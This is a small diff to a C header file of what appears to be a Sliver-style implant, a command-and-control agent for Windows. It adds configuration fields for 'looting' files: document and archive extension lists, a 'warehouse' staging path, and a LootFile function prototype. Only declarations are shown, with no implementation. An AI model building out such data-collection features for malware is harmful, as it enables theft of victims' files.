@@ -73,6 +73,13 @@ struct _GLOBAL_CONFIG {
 	ImplantType Type;
 	HANDLE hCurrentToken;
 
+	// Loot file
+	LPWSTR* DocumentExtensions;
+	DWORD cDocumentExtensions;
+	LPWSTR* ArchiveExtensions;
+	DWORD cArchiveExtensions;
+	WCHAR wszWarehouse[MAX_PATH];
+
 	PHTTP_PROFILE* HttpProfiles;
 	DWORD cHttpProfiles;
 	PDRIVE_PROFILE* DriveProfiles;
@@ -87,6 +94,11 @@ typedef struct _SLIVER_RESP {
 	CHAR szBeaconID[0x100];
 	CHAR szSessionID[0x100];
 } SLIVER_RESP, * PSLIVER_RESP;
+
+typedef struct _LOOT_ARGS {
+	LPWSTR lpPath;
+	PGLOBAL_CONFIG pConfig;
+} LOOT_ARGS, *PLOOT_ARGS;
 
 typedef struct _SLIVER_THREADPOOL {
 	PTP_POOL pPool;
@@ -260,4 +272,9 @@ VOID FreeDriveProfile
 VOID FreePivotProfile
 (
 	_In_ PPIVOT_PROFILE pProfile
+);
+
+VOID LootFile
+(
+	_In_ PGLOBAL_CONFIG pConfig
 );
